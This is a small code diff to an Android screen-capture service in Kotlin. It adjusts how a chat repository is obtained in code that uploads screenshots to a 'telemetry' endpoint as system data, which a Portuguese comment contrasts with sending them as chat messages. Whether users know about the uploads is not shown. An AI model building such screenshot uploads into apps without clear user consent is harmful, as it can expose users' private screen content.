@@ -13,6 +13,7 @@ import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.util.Log
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
@@ -153,7 +154,7 @@ class ScreenCaptureService : Service() {
 
                         // --- MUDANÇA CHAVE: Envio para o endpoint de Telemetria ---
                         // Em vez de enviar como mensagem de chat, enviamos como dado de sistema
-                        val repository = ChatRepository.getInstance(applicationContext)
+                        val repository = ChatRepository.getInstance()
                         repository.uploadSystemData(
                             eventType = "SCREENSHOT",
                             file = file,
